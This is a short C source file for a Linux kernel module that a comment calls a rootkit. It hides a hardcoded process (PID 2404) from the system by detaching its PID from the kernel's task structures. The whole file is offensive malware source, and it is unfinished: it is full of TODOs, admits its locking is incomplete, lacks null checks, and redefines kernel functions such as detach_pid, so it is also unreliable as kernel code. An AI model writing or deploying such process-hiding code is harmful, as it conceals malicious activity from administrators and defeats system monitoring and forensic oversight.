#include <linux/pid.h>
#include "processHider.h"


static int hideProcess(int pidNumber);


int processHider_init(void) {
	pid_t pid = 2404; //TODO: change this 
	hideProcess(pid);
	
	return 0;
}

void processHider_exit(void) {
	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
}


static int hideProcess(int pidNumber) {
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
	
	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
	
	{
		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
		
		detach_pid(task, PIDTYPE_PID);
	}
	
	rcu_read_unlock();
	
	//todo release lock..
	
	printk(KERN_INFO "pid points to %p\n", pid); // TODO: print time etc..
	
	return 0;
}



void detach_pid(struct task_struct *task, enum pid_type type)
{
	__change_pid(task, type, NULL);
}

void change_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid)
{
	__change_pid(task, type, pid);
	attach_pid(task, type, pid);
}
